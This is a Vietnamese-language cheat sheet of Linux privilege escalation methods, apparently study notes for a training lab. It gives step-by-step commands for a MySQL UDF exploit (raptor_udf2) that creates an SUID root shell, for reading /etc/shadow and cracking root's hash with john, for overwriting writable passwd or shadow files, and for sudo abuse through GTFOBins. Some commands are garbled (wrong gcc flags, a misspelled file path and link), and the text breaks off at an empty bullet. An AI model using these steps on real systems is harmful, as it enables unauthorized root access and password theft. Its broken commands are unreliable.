# Các cách tân công leo thang đặc quyền (Privilege Escalation)
---------------
## Service Exploits (Khai thác dịch vụ
* MySQL server đang chạy với quyền root nhưng root user lại không được cấp pass. Ta có thể khai thác User Defined Functions (UDFs) để chạy command với quyền root thông qua MySQL
  - Đầu tiên ta cd đến folder của MySQL UDFs: ```cd /home/<username>/tools/mysql-udf```
  - Thực thi code xâm nhập raptor_udf2.c:

        gcc -g -c raptor_udf2.c -fPIC
        gcc -g -shared -wl, -soname, raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lv
  - Kết nối tới MySQL với quyền root (mật khẩu rỗng):
 
        mysql -u root
  - Thực thi những câu lệnh sau để MySQL shell để tạo một UDFs:
 
        use mysql;
        create table foo(line blob);
        insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
        select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
        create function do_system returns integer soname 'raptor_udf2.so';
  - Dùng hàm để copy /bin/bash với /tmp/rootbash và cấp quyền SUID

        select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
  - Thoát shell MySQL (dùng ```exit``` hoặc ```\q```) và chạy lệnh với option ```-p``` để chạy shell với đặc quyền root

        /tmp/rootbash -p
  - Nhớ xoá ```/tmp/rootbash``` và thoát khỏi root shell trước khi tiếp tục
    
        rm /tmp/rootbash
        exit
    
------------------------
## Lợi dụng readable file (/etc/shadow)
* File /etc/shadow chứa pass của user dưới dạng mã hoá và thường chỉ root user mới có thể đọc
  - Nếu file này có thể đọc bởi user khác thì ta có thể lợi dụng điều này:

        cat /etc/shadơ
  - Mỗi dòng là thông tin của một user, đoạn thứ 2 của mỗi dòng là pass của user được hash
  - Copy pass của root và nhét vào một file (VD: hash.txt)
  - Dùng ```john``` hoặc một công cụ crack pass bất kỳ để dịch hash:

        john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
  - Chuyển tới root bằng pass mới thu được

        su root
-----------------------
## Lợi dụng writeable file (/etc/passwd và /etc/shadow)
* Ta có thể lợi dụng 2 file này để đổi mật khẩu của root user
  - Với file ```passwd```:

        openssl passwd <pass của bạn>
  (Câu lệnh này sẽ mã hoá pass bạn nhập vào cùng loại với pass của file ```passwd```
  - Với file ```shadow```:

        mkpasswd -m sha-512 <pass của bạn>
  (Câu lệnh này mã hoá pass của bạn bằng sha-512, cùng loại với file ```shadow```
  
------------------------
## Shell Escape Sequences (Thoát Shell tuần tự)
* Thoát SHELL:
  - Kiểm tra các chương trình user hiện tại có thể chạy

        sudo -l
  - SỬ dụng trang web [GTFOBins](https://gtffobins.github.io) và search các tên chương trình, nếu chương trình cần sudo để chạy, bạn có thể lợi dụng để leo thang đặc quyền
  - Chọn chương trình như trên và thử lấy root shell, sử dụng hướng dẫn trong [GTFOBins](https://gtffobins.github.io)
  - 
